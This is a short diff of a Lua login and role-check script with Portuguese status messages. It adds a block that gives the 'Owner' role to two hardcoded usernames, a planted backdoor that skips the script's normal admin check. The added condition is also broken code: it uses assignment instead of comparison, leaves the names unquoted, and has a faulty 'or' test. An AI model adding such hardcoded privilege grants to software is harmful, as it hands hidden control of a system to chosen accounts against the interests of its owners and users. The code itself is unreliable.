@@ -200,7 +200,9 @@ local adminResult = checarAdmin()
 if not adminResult then
     userRole = "guest"
 end
-
+if username = bugagamesreal or yas_teama3 then
+    userRole = "Owner"
+end
 -- step 4: check ban
 setStep(4, "checando acesso...")
 local isBanned = dbGet("banned/" .. username)
